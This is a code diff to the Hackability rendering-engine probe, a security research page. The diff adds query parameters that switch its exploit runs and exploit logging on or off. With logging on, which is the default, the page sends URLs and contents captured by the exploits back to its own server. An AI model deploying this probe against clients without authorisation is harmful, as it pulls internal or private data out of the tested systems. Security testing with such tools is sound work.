@@ -1,6 +1,8 @@
 <?php
 require('inc/functions.inc.php');
 $blind = isset($_GET['blind']) ? (int) $_GET['blind'] : 0;
+$exploits = isset($_GET['exploits']) ? (int) $_GET['exploits'] : 1;
+$logExploits = isset($_GET['logExploits']) ? (int) $_GET['logExploits'] : 1;
 ?>
 <html>
 <head>
@@ -98,6 +100,13 @@ Hackability.generateRequestUrl = function(type) {
 <div class="container">
     <h1>Rendering Engine Hackability Probe</h1>
     <p>This page attempts to detect what technologies the client supports. You can find the source at <a href="https://github.com/PortSwigger/hackability">https://github.com/PortSwigger/hackability</a>. For further information, please refer to the whitepaper at <a href='http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html'>http://blog.portswigger.net/2017/07/cracking-lens-targeting-https-hidden.html</a></p>
+
+		<h2>Supported query parameters</h2>
+		<ul>
+			<li>Render the JavaScript tests and save the result (off by default) - blind=1<br />Data can be retrieved from <a href="inspector/display.php">here</a>.</li>
+			<li>Enable/Disable exploits (on by default) - exploits=1</li>
+			<li>Log data from exploits (on by default) - logExploits=1</li>
+		</ul>
 <table>
   <tr>
     <td valign=top>
@@ -340,7 +349,14 @@ var props = Inspector.getKnownWindowProps().concat(['Inspector','Hackability']),
 		req.onreadystatechange = function(){
 			if(req.readyState === 4) {
 				if(req.responseText.length) {
-					Hackability.makeRequest(type+'&contents='+encodeURIComponent(req.responseText));
+					<?php
+					if($logExploits) {
+							echo "Hackability.makeRequest(type+'&contents='+encodeURIComponent(req.responseText));";
+					} else {
+							echo "Hackability.makeRequest(type);";
+					}
+					?>
+
 					Hackability.generateRow(true, msgTrue);
 				} else {
 					Hackability.makeRequest(info);
@@ -655,7 +671,13 @@ Hackability.iframe_handler = function(iframe, type, msg){
     contents = '';
   }
 	if(!/IGNORE THIS CONTENTS/i.test(contents) && isInterestingUrl(url) && contents.length) {
-		Hackability.makeRequest(type+'?&url='+encodeURIComponent(url)+'&contents='+encodeURIComponent(contents));
+		<?php
+		if($logExploits) {
+			echo "Hackability.makeRequest(type+'?&url='+encodeURIComponent(url)+'&contents='+encodeURIComponent(contents));";
+		} else {
+			echo "Hackability.makeRequest(type+'?&url='+encodeURIComponent(url));";
+		}
+		?>
 		Hackability.generateRow(true,msg+':url='+url+', contents='+contents);
 	}
 };
@@ -779,7 +801,10 @@ Hackability.runExploits = function() {
 			}
 			?>
 			setTimeout(function(){
-				Hackability.runExploits();
+				<?php if($exploits){
+					echo 'Hackability.runExploits();';
+				}
+				?>
 	      Hackability.print();
 			}, 5000);
 		}, false);
@@ -790,7 +815,10 @@ Hackability.runExploits = function() {
 			}
 			?>
 			setTimeout(function(){
-				Hackability.runExploits();
+				<?php if($exploits){
+					echo 'Hackability.runExploits();';
+				}
+				?>
 	      Hackability.print();
 			}, 5000);
 		});
